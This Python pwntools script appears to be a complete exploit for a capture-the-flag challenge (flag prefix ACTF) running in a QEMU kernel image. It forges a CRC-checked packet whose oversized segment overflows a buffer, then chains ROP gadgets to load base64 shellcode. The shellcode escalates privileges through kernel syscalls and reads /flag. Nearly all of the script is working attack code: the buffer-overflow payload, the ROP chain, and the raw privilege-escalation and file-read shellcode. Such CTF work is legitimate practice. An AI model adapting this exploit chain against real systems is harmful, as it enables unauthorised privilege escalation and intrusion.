from socket import timeout
from struct import pack
from pwn import *
import ctypes
import time
import base64

libcrc = ctypes.CDLL("./libcrc.so")

def native_crc32(buf, length):
    return libcrc.xcrc32(buf, length, 0xabababab)

p = process(['qemu-system-x86_64', '-m', '1024M', '-kernel', 'bzImage', '-initrd', 'rootfs.img', '-monitor', '/dev/null', '-append', 'root=/dev/ram console=ttyS0 oops=panic kaslr kpti=1 quiet', '-cpu', 'qemu64,+smep,+smap', '-nographic', '-cpu', 'kvm64,+smep,+smap', '-smp', 'cores=2,threads=2', '-enable-kvm'])

shellcode = b'AWAV\xb9\x80\x00\x00\x00AUATA\xb8\x10\x00\x00\x00US1\xedH\x89\xe8f\x0f\xef\xc0H\x81\xec\x00\x08\x00\x00A\xb9\x03\x00\x00\x00\xbedk\x00\x00H\x8d|$\xf8L\x8dT$\xf8H\x8d\x9c$\xf8\x03\x00\x00\x0f)D$\xa8\xf3H\xabH\x8d\xbc$\xf8\x03\x00\x00\xb9\x80\x00\x00\x00H\x8dT$\x98\x0f)D$\x98H\xc7D$\xe8\x00\x00\x00\x00L\x89T$\xa8\x0f)D$\xc8\x0f)D$\xd8\xf3H\xabH\xb8\xee)\xa4\xbd\x9a.\x00\x00H\x89\\$\xb8\xc7D$\xb0\x0e\x00\x00\x00H\x89\x84$\x00\x04\x00\x00H\xb8\x01\x00\x00\x00\xc2\x01\x00\x00L\x89\xcfH\x89D$\x9cD\x89\xc0\x0f\x05D\x89\xc0\x0f\x05D\x89\xc0\x0f\x05D\x89\xc0\x0f\x05D\x89\xc0\x0f\x05D\x89\xc0\x0f\x05D\x89\xc0\x0f\x05A\xbckk\x00\x00\xc7D$\xc8\x03\x00\x00\x00H\x8dT$\xc8D\x89\xc0L\x89\xe6\x0f\x05A\xbeik\x00\x00\xc7D$\xc8\x04\x00\x00\x00L\x89T$\xd8H\x89\\$\xe8D\x89\xc0L\x89\xf6\x0f\x05H\x8b\x84$\xd0\x01\x00\x00H\x8b\x8c$\xf0\x01\x00\x00A\xbdgk\x00\x00H\xc7\x84$\xc8\x01\x00\x00\x10\x00\x00\x00\xc7D$\xc8\x04\x00\x00\x00L\x89\xeeL\x89T$\xd8H\x89\\$\xe8H\x89D$\x88H\x8d\x81p\x0c\x00\x00H\x89\x84$\xd0\x01\x00\x00D\x89\xc0\x0f\x05\xc7D$\xc8\x05\x00\x00\x00L\x89T$\xd8D\x89\xc0H\x89\\$\xe8L\x89\xf6\x0f\x05H\x8b4$I\x8c\xcfH\x8c\xd1I\x89\xe3\x9cA^H\x89L$\x90H\x89\xe8L\x89\xd7\xb9\x80\x00\x00\x00\xc7D$\xc8\x04\x00\x00\x00L\x89T$\xd8\xf3H\xabH\x8d\x869\x86\xe4\xffH\x8bL$\x90H\x89\\$\xe8H\xc7\x84$`\x02\x00\x00\x00\x80m\x00L\x89\xbc$h\x02\x00\x00L\x89\xcfH\x89\x84$\xf0\x01\x00\x00H\x8d\x864\xbd\xdd\xffL\x89\xb4$p\x02\x00\x00L\x89\x9c$x\x02\x00\x00H\x89\x8c$\x80\x02\x00\x00H\x89\x84$\x08\x02\x00\x00H\x8d\x86\xb0f\xe7\xffH\x89\x84$\x18\x02\x00\x00H\x8d\x86\xbeP\x04\x00H\x89\x84$ \x02\x00\x00H\x8d\x86{\xa3@\x00H\x89\x84$(\x02\x00\x00H\x8d\x86\x10d\xe7\xffH\x81\xc6F\xb5\xbd\x00H\x89\xb4$H\x02\x00\x00L\x89\xeeH\x89\x84$@\x02\x00\x00D\x89\xc0\x0f\x05H\x8bD$\x88\xc7D$\xc8\x05\x00\x00\x00L\x89\xe6L\x89T$\xd8H\x89\\$\xe8H\x89D$\xe0D\x89\xc0\x0f\x05H\x81\xc4\x00\x08\x00\x001\xc0[]A\\A]A^A_\xc3'
shellcodeb64 = base64.b64encode(shellcode)

privcode = b'H\x83\xec \xb8g\x00\x00\x001\xf6H\x8d|$\x98f\x89D$\x96\xb9\x10\x00\x00\x00H\x89\xf0\xc7D$\x92/fla\xf3H\xabH\x8d|$\x92\xb8\x02\x00\x00\x00\x0f\x05\xba\x80\x00\x00\x00Hc\xf8H\x8dt$\x981\xc0\x0f\x05\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x0f\x05\xeb\xfe'
privcodeb64 = base64.b64encode(privcode)

segment = b""
segment += p32(0)   # attribute
segment += p32(0xf0000000) # size
segment += b"A" * 0x849    # debug to find this out

payload = b""
payload += p64(0x00000000004006a6)
payload += p64(0x000000006d4000)
payload += p64(0x0000000000402a3c)
payload += p64(0x7000)
payload += p64(0x0000000000434162)
payload += p64(0x7)
payload += p64(0x45a940)
payload += p64(0x00000000004006a6)
payload += p64(0x0)
payload += p64(0x0000000000402a3c)
payload += p64(0x6db4a0)
payload += p64(0x0000000000434162)
payload += p64(len(shellcodeb64) + 1)
payload += p64(0x459aa0)
payload += p64(0x00000000004006a6)
payload += p64(0x6db4a0)
payload += p64(0x0000000000402a3c)
payload += p64(len(shellcodeb64))
payload += p64(0x0000000000434162)
payload += p64(0x000000006d4000)
payload += p64(0x00000000004005af)
payload += p64(0x6dc4a8)
payload += p64(0x000000000040d0cb)
payload += p64(0x6dc4a8)
payload += p64(0x40109e)
payload += p64(0x00000000004006a6)
payload += p64(0x0)
payload += p64(0x0000000000402a3c)
payload += p64(0x6db4a0)
payload += p64(0x0000000000434162)
payload += p64(len(privcodeb64) + 1)
payload += p64(0x459aa0)
payload += p64(0x00000000004006a6)
payload += p64(0x6db4a0)
payload += p64(0x0000000000402a3c)
payload += p64(len(privcodeb64))
payload += p64(0x0000000000434162)
payload += p64(0x6d8000) # put here
payload += p64(0x00000000004005af)
payload += p64(0x6dc4a8)
payload += p64(0x000000000040d0cb)
payload += p64(0x6dc4a8)
payload += p64(0x40109e)
payload += p64(0x000000006d4000)    # can return to shellcode now

segment += payload

segmenthdr = b""
segmenthdr += p32(1)    # count
segmenthdr += p32(512 + 8)  # length

phdr = b""
phdr += p32(0xAAA)  # magic
phdr += p32(0x01)  # version
phdr += p32(0)  # sequence
phdr += p32(0)  # pad
totalsize = 48 + 8 + 8 + 512
phdr += p32(totalsize)   # total size
phdr += p32(0)  # checksum TODO
phdr += p32(0)  # src
phdr += p32(0)  # dst
phdr += b"\x00" * 16 # option

packet = phdr + segmenthdr + segment
crc32 = native_crc32(packet, totalsize)
phdr = phdr[:20] + p32(crc32 & 0xffffffff) + phdr[24:]

p.recvuntil('ENTER YOUR PACKET > ')
p.send(base64.b64encode(phdr))
p.send(base64.b64encode(segmenthdr))
p.sendline(base64.b64encode(segment))
p.sendline(shellcodeb64)
p.sendline(privcodeb64)

p.recvuntil(b'ACTF{')
flag = p.recvline().strip()
flag = b'ACTF{' + flag

print("after privilege escalation and orw")
print(flag)

p.close()
